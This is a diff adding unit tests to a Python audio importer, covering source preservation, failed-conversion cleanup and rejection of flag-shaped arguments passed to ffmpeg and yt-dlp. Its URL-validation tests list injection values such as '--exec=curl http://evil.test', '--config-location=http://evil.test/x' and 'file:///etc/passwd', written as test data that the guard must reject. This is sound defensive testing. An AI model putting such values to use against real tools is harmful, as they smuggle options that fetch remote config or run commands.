@@ -15,18 +15,21 @@ from __future__ import annotations
 import contextlib
 import io
 import shutil
+import subprocess
 import sys
 import tempfile
 import unittest
 from pathlib import Path
+from unittest import mock
 
 ROOT = Path(__file__).resolve().parent.parent
 sys.path.insert(0, str(ROOT / "tools"))
 sys.path.insert(0, str(ROOT / "tests"))
 
-import import_track as it  # noqa: E402
-import manifest as mf  # noqa: E402
-from helpers import make_click_track  # noqa: E402
+import import_fetch as imf
+import import_track as it
+import manifest as mf
+from helpers import make_click_track
 
 
 class CliCase(unittest.TestCase):
@@ -71,6 +74,28 @@ class TestImportFromFile(CliCase):
         self.assertIn("imported", out)
         self.assertIn("demo.mp3", out)
 
+    def test_a_source_in_tracks_under_its_own_id_survives(self) -> None:
+        """`import_track.py tracks/foo.wav --id foo` converts foo.wav to
+        foo.mp3 and then the one-file-per-id sweep deleted foo.wav — the
+        original, the only thing Re-import can work from (judge B, JB2-2)."""
+        src = it.TRACKS / "foo.wav"
+        shutil.copy(self.src, src)
+        code, _ = self.run_cli(str(src), "--id", "foo")
+        self.assertEqual(code, 0)
+        self.assertTrue((it.TRACKS / "foo.mp3").exists())
+        self.assertTrue(src.exists(), "the importer ate its own source")
+        meta = mf.get("foo")
+        assert meta is not None
+        self.assertTrue(Path(meta["source"].removeprefix("file:")).exists())
+
+    def test_a_refresh_to_another_container_still_sweeps_the_old_one(self) -> None:
+        self.run_cli(str(self.src), "--id", "demo")
+        self.assertTrue((it.TRACKS / "demo.mp3").exists())
+        code, _ = self.run_cli("--refresh", "demo", "--format", "wav")
+        self.assertEqual(code, 0)
+        self.assertTrue((it.TRACKS / "demo.wav").exists())
+        self.assertFalse((it.TRACKS / "demo.mp3").exists(), "two files for one id")
+
     def test_prints_a_pasteable_scene(self) -> None:
         """The output is the handover to scenes.yaml; if it stops being valid
         YAML the workflow silently breaks at the paste step."""
@@ -103,9 +128,56 @@ class TestImportFromFile(CliCase):
         with self.assertRaises(SystemExit):
             self.run_cli(str(self.tmp / "nope.wav"), "--id", "x")
 
+    def test_flag_shaped_and_nonsense_times_are_refused_by_argparse(self) -> None:
+        """`start: "-x"` from the studio used to reach ffmpeg as an option;
+        now argparse refuses it (exit 2) before anything runs."""
+        for opt, val in (("--start", "-x"), ("--take", "--force"),
+                         ("--start", "abc"), ("--take", "1:99"), ("--start", "")):
+            with self.assertRaises(SystemExit, msg=f"{opt} {val!r}") as cm, \
+                    contextlib.redirect_stderr(io.StringIO()):
+                self.run_cli(str(self.src), f"{opt}={val}")
+            self.assertEqual(cm.exception.code, 2, f"{opt} {val!r}")
+
+    def test_times_are_accepted_as_seconds_or_colon_forms(self) -> None:
+        for raw in ("12", "0.5", "0:12", "1:02:03", "12:34.5"):
+            self.assertEqual(it.time_arg(raw), raw)
+
+    def test_notes_may_not_start_with_a_dash(self) -> None:
+        with self.assertRaises(SystemExit) as cm, \
+                contextlib.redirect_stderr(io.StringIO()):
+            self.run_cli(str(self.src), "--notes=--force")
+        self.assertEqual(cm.exception.code, 2)
+        code, _ = self.run_cli(str(self.src), "--id", "noted", "--notes=loud - keep")
+        self.assertEqual(code, 0)
+        self.assertEqual((mf.get("noted") or {})["notes"], "loud - keep")
+
     def test_no_source_fails(self) -> None:
         with self.assertRaises(SystemExit):
             self.run_cli("--id", "x")
+
+    def test_a_failed_convert_leaves_no_track_behind(self) -> None:
+        """Pass-1 J1-2: ffmpeg opens its output before it knows the input is
+        junk, so a failed import used to leave a 0-byte track the desk then
+        offered to send to the castle."""
+        junk = self.tmp / "junk.mp3"
+        junk.write_bytes(b"this is not audio" * 100)
+        with self.assertRaises(SystemExit) as cm:
+            self.run_cli(str(junk), "--id", "junk")
+        self.assertIn("playable audio", str(cm.exception))
+        self.assertEqual(sorted(p.name for p in it.TRACKS.iterdir()), [])
+        self.assertIsNone(mf.get("junk"))
+
+    def test_a_failed_refresh_keeps_the_good_copy(self) -> None:
+        self.run_cli(str(self.src), "--id", "keep")
+        out = it.TRACKS / "keep.mp3"
+        before = out.read_bytes()
+        # The remembered source turns to junk underneath the re-import.
+        self.src.write_bytes(b"not audio any more")
+        with self.assertRaises(SystemExit):
+            self.run_cli("--refresh", "keep")
+        self.assertEqual(out.read_bytes(), before)
+        self.assertEqual(sorted(p.name for p in it.TRACKS.iterdir()
+                                if p.name.endswith(".part")), [])
 
 
 class TestOptions(CliCase):
@@ -189,3 +261,50 @@ class TestListAndAnalyze(CliCase):
 
 if __name__ == "__main__":
     unittest.main(verbosity=2)
+
+
+class TestUrlIsAUrl(unittest.TestCase):
+    """The studio passes the browser's source string to yt-dlp as an argument.
+
+    `"://" in source` was the old test for "is this a link", and a value that
+    starts with a dash passes it — at which point yt-dlp reads the whole thing
+    as one of its own options rather than as something to download.
+    `--config-location=http://…` is the sharp end of that.
+    """
+
+    def test_http_and_https_links_are_links(self) -> None:
+        for url in ("http://example.test/a.mp3",
+                    "https://example.test/watch?v=x",
+                    "HTTPS://Example.test/A"):
+            self.assertTrue(it.is_web_url(url), url)
+
+    def test_an_option_wearing_a_url_is_not(self) -> None:
+        for bad in ("--config-location=http://evil.test/x",
+                    "-o/tmp/x http://evil.test",
+                    "--exec=curl http://evil.test"):
+            self.assertFalse(it.is_web_url(bad), bad)
+
+    def test_other_schemes_and_paths_are_not(self) -> None:
+        for bad in ("ftp://x.test/a", "file:///etc/passwd", "/Users/j/a.mp3",
+                    "a.mp3", "https://", ""):
+            self.assertFalse(it.is_web_url(bad), bad)
+
+    def test_fetch_refuses_before_it_spawns_anything(self) -> None:
+        """The guard is in fetch_url too, not only at the call site."""
+        with mock.patch.object(imf.subprocess, "run") as run, \
+                tempfile.TemporaryDirectory() as td:
+            with self.assertRaises(SystemExit) as e:
+                it.fetch_url("--config-location=http://evil.test/x", Path(td))
+            self.assertIn("http(s) only", str(e.exception))
+            run.assert_not_called()
+
+    def test_a_real_link_is_passed_after_a_double_dash(self) -> None:
+        """`--` closes the option list, so a link can never become a flag."""
+        with mock.patch.object(imf, "_ytdlp", return_value="yt-dlp"), \
+                mock.patch.object(imf.subprocess, "run") as run, \
+                tempfile.TemporaryDirectory() as td:
+            run.return_value = subprocess.CompletedProcess([], 1, "", "nope")
+            with contextlib.suppress(SystemExit):
+                it.fetch_url("https://example.test/a", Path(td))
+            argv = run.call_args[0][0]
+            self.assertEqual(argv[-2:], ["--", "https://example.test/a"])
